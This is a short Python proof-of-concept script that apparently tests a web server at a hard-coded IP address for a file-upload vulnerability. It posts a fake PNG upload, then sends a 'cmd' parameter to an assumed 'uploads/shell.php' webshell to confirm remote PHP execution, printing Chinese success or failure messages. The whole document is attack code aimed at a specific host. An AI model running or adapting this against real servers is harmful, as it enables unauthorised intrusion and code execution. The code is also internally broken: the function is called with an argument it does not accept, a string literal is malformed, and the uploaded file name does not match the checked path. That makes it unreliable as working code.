import requests


def POC():
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'}

    payload1 = """"
    Content-Type: multipart/form-data; boundary=---------------------------2016461162196909439971799935
    -----------------------------2016461162196909439971799935
    Content-Disposition: form-data; name="upload_file"; filename="1.png"
    Content-Type: image/png
    
    PNG
    
    """

    res1 = requests.post(url, headers=headers, data=payload1)
    # print(res1.text)
    img_path = "uploads/shell.php"
    if img_path in res1.text:
        print('上传成功！')

    payload2 = {
        "cmd": "phpinfo();"
    }
    res2 = requests.post(url + img_path, data=payload2)
    if "PHP Version" in res2.text:
        print("{} 存在文件上传漏洞".format(url))
    else:
        print("{} 不存在文件上传漏洞".format(url))


if __name__ == '__main__':
    url = "http://120.25.24.45:30522"
    POC(url)
